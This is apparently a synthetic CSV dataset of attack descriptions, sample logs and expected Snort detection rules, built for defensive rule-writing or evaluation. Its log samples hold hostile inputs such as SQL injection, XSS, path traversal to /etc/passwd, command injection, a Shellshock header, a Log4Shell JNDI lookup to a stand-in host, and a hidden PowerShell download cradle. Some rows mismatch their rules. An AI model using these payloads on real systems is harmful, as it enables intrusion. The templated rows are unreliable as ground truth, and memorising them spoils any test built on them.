doc_id,attack_description,description_style,attack_family,attack_type,protocol,source_zone,destination_zone,source_port,destination_port,service,payload_pattern,log_excerpt,expected_snort_rule,rule_explanation,severity,false_positive_risk,mitre_technique,keywords,synthetic_generation_method,needs_retrieval
SNORT_0137,SOC ticket: suspicious Reconnaissance activity observed. Identify a possible port scan where one source sends many SYN packets to HTTP on port 80.,incident_ticket,Reconnaissance,TCP SYN Port Scan,tcp,$EXTERNAL_NET,$HOME_NET,any,80,HTTP,flags:S,IDS flow: repeated SYN packets from 198.51.100.84 to 10.0.2.10:80 in 10 seconds,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000137; rev:1;)","This Snort rule is designed for TCP SYN Port Scan in the Reconnaissance family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as flags:S. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1046 Network Service Discovery,"scan, syn, port, reconnaissance, nmap",manual template + controlled random variations,True
SNORT_0138,Rule for icmp ping sweep on the network.,short,Reconnaissance,ICMP Ping Sweep,icmp,$EXTERNAL_NET,$HOME_NET,any,any,generic network,icmp echo,Firewall log: ICMP echo requests to multiple hosts from 198.51.100.28,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000138; rev:1;)","This Snort rule is designed for ICMP Ping Sweep in the Reconnaissance family. It monitors ICMP traffic on destination port any (generic network) and uses indicators such as icmp echo. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",low,medium,T1018 Remote System Discovery,"icmp, ping, sweep, reconnaissance, echo",manual template + controlled random variations,True
SNORT_0139,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 443.",analyst_request,DoS_DDoS,TCP SYN Flood,tcp,$EXTERNAL_NET,$HOME_NET,any,443,HTTPS,half-open,src=multiple dst=10.0.1.31 proto=TCP dpt=443 flags=S count=900 in=5s,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN flood against HTTPS""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000139; rev:1;)","This Snort rule is designed for TCP SYN Flood in the DoS_DDoS family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as half-open. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1498 Network Denial of Service,"syn flood, dos, ddos, tcp, web",manual template + controlled random variations,True
SNORT_0140,Need IDS detection logic for UDP Flood: Identify possible UDP denial-of-service traffic on port 123. Include protocol and threshold constraints.,technical,DoS_DDoS,UDP Flood,udp,$EXTERNAL_NET,$HOME_NET,any,123,NTP,high udp rate,Collector: UDP packets to 10.0.4.38:123 exceed baseline by 800%,"alert udp $EXTERNAL_NET any -> $HOME_NET 123 (msg:""Possible UDP flood on NTP""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000140; rev:1;)","This Snort rule is designed for UDP Flood in the DoS_DDoS family. It monitors UDP traffic on destination port 123 (NTP) and uses indicators such as high udp rate. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1498 Network Denial of Service,"udp, flood, dos, amplification",manual template + controlled random variations,True
SNORT_0141,Rule for sql injection on the network.,short,Web_Attack,SQL Injection,tcp,$EXTERNAL_NET,$HOME_NET,any,80,HTTP,UNION SELECT,HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.122,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000141; rev:1;)","This Snort rule is designed for SQL Injection in the Web_Attack family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as UNION SELECT. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,low,T1190 Exploit Public-Facing Application,"sql injection, sqli, union, select, web",manual template + controlled random variations,True
SNORT_0142,SOC ticket: suspicious Web_Attack activity observed. Create a rule for HTTP URI containing encoded or clear script payloads.,incident_ticket,Web_Attack,Cross Site Scripting,tcp,$EXTERNAL_NET,$HOME_NET,any,8080,HTTP-alt,javascript:,HTTP request uri=/comment?msg=%3Cscript%3Ealert(1)%3C/script%3E src=198.51.100.138,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible reflected XSS script tag""; flow:to_server,established; content:""<script""; nocase; http_uri; classtype:web-application-attack; sid:1000142; rev:1;)","This Snort rule is designed for Cross Site Scripting in the Web_Attack family. It monitors TCP traffic on destination port 8080 (HTTP-alt) and uses indicators such as javascript:. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1189 Drive-by Compromise,"xss, script, javascript, web",manual template + controlled random variations,True
SNORT_0143,"As a security analyst, I want to detect this behavior: Detect directory traversal attempts using ../ sequences in HTTP URI.",analyst_request,Web_Attack,Directory Traversal,tcp,$EXTERNAL_NET,$HOME_NET,any,443,HTTPS,/etc/passwd,GET /download?file=../../../../etc/passwd HTTP/1.1 host=app.local,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible directory traversal attempt""; flow:to_server,established; content:""../""; http_uri; classtype:web-application-attack; sid:1000143; rev:1;)","This Snort rule is designed for Directory Traversal in the Web_Attack family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as /etc/passwd. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,low,T1190 Exploit Public-Facing Application,"directory traversal, path traversal, etc passwd, web",manual template + controlled random variations,True
SNORT_0144,Rule for command injection on the network.,short,Web_Attack,Command Injection,tcp,$EXTERNAL_NET,$HOME_NET,any,443,HTTPS,&& id,GET /ping?host=127.0.0.1;whoami HTTP/1.1 src=198.51.100.33,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible HTTP command injection""; flow:to_server,established; pcre:""/(;|\||&&)(whoami|id|cat)/Ui""; classtype:web-application-attack; sid:1000144; rev:1;)","This Snort rule is designed for Command Injection in the Web_Attack family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as && id. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,medium,T1059 Command and Scripting Interpreter,"command injection, whoami, cat, shell, web",manual template + controlled random variations,True
SNORT_0145,Rule for ssh brute force on the network.,short,Brute_Force,SSH Brute Force,tcp,$EXTERNAL_NET,$HOME_NET,any,22,SSH,many failed ssh logins,sshd: Failed password for invalid user admin from 203.0.113.205 port 51422 repeated=18,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""Possible SSH brute force attempts""; flow:to_server,established; detection_filter:track by_src, count 15, seconds 60; classtype:attempted-recon; sid:1000145; rev:1;)","This Snort rule is designed for SSH Brute Force in the Brute_Force family. It monitors TCP traffic on destination port 22 (SSH) and uses indicators such as many failed ssh logins. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1110 Brute Force,"ssh, brute force, login, authentication",manual template + controlled random variations,True
SNORT_0146,SOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,incident_ticket,Brute_Force,FTP Brute Force,tcp,$EXTERNAL_NET,$HOME_NET,any,21,FTP,PASS,FTP control channel contains repeated USER commands from 198.51.100.56,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000146; rev:1;)","This Snort rule is designed for FTP Brute Force in the Brute_Force family. It monitors TCP traffic on destination port 21 (FTP) and uses indicators such as PASS. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1110 Brute Force,"ftp, brute force, user, pass",manual template + controlled random variations,True
SNORT_0147,Generate a rule for possible malware C2 HTTP beacon traffic.,formal,Malware_C2,HTTP C2 Beacon,tcp,$HOME_NET,$EXTERNAL_NET,any,8080,HTTP-alt,periodic,Proxy log: repeated small HTTP requests with fixed interval from host 10.0.6.106,"alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000147; rev:1;)","This Snort rule is designed for HTTP C2 Beacon in the Malware_C2 family. It monitors TCP traffic on destination port 8080 (HTTP-alt) and uses indicators such as periodic. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,medium,T1071.001 Web Protocols,"c2, beacon, malware, http, periodic",manual template + controlled random variations,True
SNORT_0148,Identify malware staging using powershell and DownloadString keywords.,formal,Malware_C2,PowerShell Download Cradle,tcp,$HOME_NET,$EXTERNAL_NET,any,443,HTTPS,Invoke-Expression,POST /cmd body=powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString(...) src=10.0.7.107,"alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000148; rev:1;)","This Snort rule is designed for PowerShell Download Cradle in the Malware_C2 family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as Invoke-Expression. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,low,T1059.001 PowerShell,"powershell, download, malware, payload, c2",manual template + controlled random variations,True
SNORT_0149,SOC ticket: suspicious DNS_Attack activity observed. Generate a rule for suspected DNS tunneling over port 53.,incident_ticket,DNS_Attack,DNS Tunneling,udp,$HOME_NET,$EXTERNAL_NET,any,53,DNS,TXT query,DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.24 count=47,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000149; rev:1;)","This Snort rule is designed for DNS Tunneling in the DNS_Attack family. It monitors UDP traffic on destination port 53 (DNS) and uses indicators such as TXT query. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1071.004 DNS,"dns, tunneling, long subdomain, txt, exfiltration",manual template + controlled random variations,True
SNORT_0150,Create a rule for DNS amplification attempts using query type ANY.,formal,DNS_Attack,DNS Amplification,udp,$HOME_NET,$EXTERNAL_NET,any,53,DNS,ANY query,UDP/53 ANY requests from one source exceed threshold,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000150; rev:1;)","This Snort rule is designed for DNS Amplification in the DNS_Attack family. It monitors UDP traffic on destination port 53 (DNS) and uses indicators such as ANY query. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1498 Network Denial of Service,"dns, amplification, any, dos",manual template + controlled random variations,True
SNORT_0151,Generate a Snort rule for HTTP payloads with ${jndi: patterns.,formal,Exploitation,Log4Shell JNDI Pattern,tcp,$EXTERNAL_NET,$HOME_NET,any,8443,HTTPS-alt,rmi://,GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8443 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000151; rev:1;)","This Snort rule is designed for Log4Shell JNDI Pattern in the Exploitation family. It monitors TCP traffic on destination port 8443 (HTTPS-alt) and uses indicators such as rmi://. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,low,T1190 Exploit Public-Facing Application,"log4j, jndi, ldap, exploit, web",manual template + controlled random variations,True
SNORT_0152,SOC ticket: suspicious Exploitation activity observed. Identify HTTP requests containing the Shellshock () { pattern.,incident_ticket,Exploitation,Shellshock CGI Pattern,tcp,$EXTERNAL_NET,$HOME_NET,any,443,HTTPS,/bin/bash,User-Agent: () { :;}; /bin/bash -c 'id' src=198.51.100.62,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000152; rev:1;)","This Snort rule is designed for Shellshock CGI Pattern in the Exploitation family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as /bin/bash. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,low,T1190 Exploit Public-Facing Application,"shellshock, cgi, bash, exploit, web",manual template + controlled random variations,True
SNORT_0153,SOC ticket: suspicious Policy_Violation activity observed. Generate a policy rule for credentials sent over cleartext protocol FTP.,incident_ticket,Policy_Violation,Cleartext Password Exposure,tcp,$HOME_NET,$EXTERNAL_NET,any,21,FTP,pwd=,FTP command PASS ******** observed from 10.0.9.9 to server,"alert tcp $HOME_NET any -> $EXTERNAL_NET 21 (msg:""Possible cleartext password exposure""; flow:to_server,established; pcre:""/(password=|pwd=|PASS\s+)/Ui""; classtype:policy-violation; sid:1000153; rev:1;)","This Snort rule is designed for Cleartext Password Exposure in the Policy_Violation family. It monitors TCP traffic on destination port 21 (FTP) and uses indicators such as pwd=. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1552 Unsecured Credentials,"cleartext, password, credentials, policy",manual template + controlled random variations,True
SNORT_0154,Need IDS detection logic for TCP SYN Port Scan: Detect repeated TCP SYN probes from an external host against a SMTP service on port 25. Include protocol and threshold constraints.,technical,Reconnaissance,TCP SYN Port Scan,tcp,$EXTERNAL_NET,$HOME_NET,any,25,SMTP,many connection attempts,IDS flow: repeated SYN packets from 198.51.100.151 to 10.0.2.5:25 in 10 seconds,"alert tcp $EXTERNAL_NET any -> $HOME_NET 25 (msg:""Possible TCP SYN scan against SMTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000154; rev:1;)","This Snort rule is designed for TCP SYN Port Scan in the Reconnaissance family. It monitors TCP traffic on destination port 25 (SMTP) and uses indicators such as many connection attempts. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1046 Network Service Discovery,"scan, syn, port, reconnaissance, nmap",manual template + controlled random variations,True
SNORT_0155,Need IDS detection logic for ICMP Ping Sweep: Detect an ICMP ping sweep where one source probes many internal hosts. Include protocol and threshold constraints.,technical,Reconnaissance,ICMP Ping Sweep,icmp,$EXTERNAL_NET,$HOME_NET,any,any,generic network,icmp echo,src=203.0.113.128 dst=10.0.244.0/24 proto=ICMP type=8 count=52,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000155; rev:1;)","This Snort rule is designed for ICMP Ping Sweep in the Reconnaissance family. It monitors ICMP traffic on destination port any (generic network) and uses indicators such as icmp echo. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",low,medium,T1018 Remote System Discovery,"icmp, ping, sweep, reconnaissance, echo",manual template + controlled random variations,True
SNORT_0156,SOC ticket: suspicious DoS_DDoS activity observed. Detect a TCP SYN flood targeting the HTTP-alt service on port 8080.,incident_ticket,DoS_DDoS,TCP SYN Flood,tcp,$EXTERNAL_NET,$HOME_NET,any,8080,HTTP-alt,high syn rate,Netflow anomaly: high half-open TCP SYN rate to 10.0.2.182:8080,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible TCP SYN flood against HTTP-alt""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000156; rev:1;)","This Snort rule is designed for TCP SYN Flood in the DoS_DDoS family. It monitors TCP traffic on destination port 8080 (HTTP-alt) and uses indicators such as high syn rate. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1498 Network Denial of Service,"syn flood, dos, ddos, tcp, web",manual template + controlled random variations,True
SNORT_0157,SOC ticket: suspicious DoS_DDoS activity observed. Create a Snort rule for excessive UDP packets sent to IKE.,incident_ticket,DoS_DDoS,UDP Flood,udp,$EXTERNAL_NET,$HOME_NET,any,500,IKE,high udp rate,src=multiple dst=10.0.3.143 proto=UDP dpt=500 count=1250 bytes=large,"alert udp $EXTERNAL_NET any -> $HOME_NET 500 (msg:""Possible UDP flood on IKE""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000157; rev:1;)","This Snort rule is designed for UDP Flood in the DoS_DDoS family. It monitors UDP traffic on destination port 500 (IKE) and uses indicators such as high udp rate. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1498 Network Denial of Service,"udp, flood, dos, amplification",manual template + controlled random variations,True
SNORT_0158,"As a security analyst, I want to detect this behavior: Detect SQL injection attempts using UNION SELECT in HTTP URI.",analyst_request,Web_Attack,SQL Injection,tcp,$EXTERNAL_NET,$HOME_NET,any,443,HTTPS,UNION SELECT,"GET /product?id=1 UNION SELECT username,password FROM users HTTP/1.1 host=shop.local","alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000158; rev:1;)","This Snort rule is designed for SQL Injection in the Web_Attack family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as UNION SELECT. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,low,T1190 Exploit Public-Facing Application,"sql injection, sqli, union, select, web",manual template + controlled random variations,True
SNORT_0159,"As a security analyst, I want to detect this behavior: Create a rule for HTTP URI containing encoded or clear script payloads.",analyst_request,Web_Attack,Cross Site Scripting,tcp,$EXTERNAL_NET,$HOME_NET,any,443,HTTPS,javascript:,HTTP request uri=/comment?msg=%3Cscript%3Ealert(1)%3C/script%3E src=198.51.100.220,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible reflected XSS script tag""; flow:to_server,established; content:""<script""; nocase; http_uri; classtype:web-application-attack; sid:1000159; rev:1;)","This Snort rule is designed for Cross Site Scripting in the Web_Attack family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as javascript:. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1189 Drive-by Compromise,"xss, script, javascript, web",manual template + controlled random variations,True
SNORT_0160,"As a security analyst, I want to detect this behavior: Generate a Snort rule for path traversal targeting sensitive files.",analyst_request,Web_Attack,Directory Traversal,tcp,$EXTERNAL_NET,$HOME_NET,any,8080,HTTP-alt,..%2f,HTTP URI contains /static/..%2f..%2fetc%2fpasswd from 203.0.113.231,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible directory traversal attempt""; flow:to_server,established; content:""../""; http_uri; classtype:web-application-attack; sid:1000160; rev:1;)","This Snort rule is designed for Directory Traversal in the Web_Attack family. It monitors TCP traffic on destination port 8080 (HTTP-alt) and uses indicators such as ..%2f. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,low,T1190 Exploit Public-Facing Application,"directory traversal, path traversal, etc passwd, web",manual template + controlled random variations,True
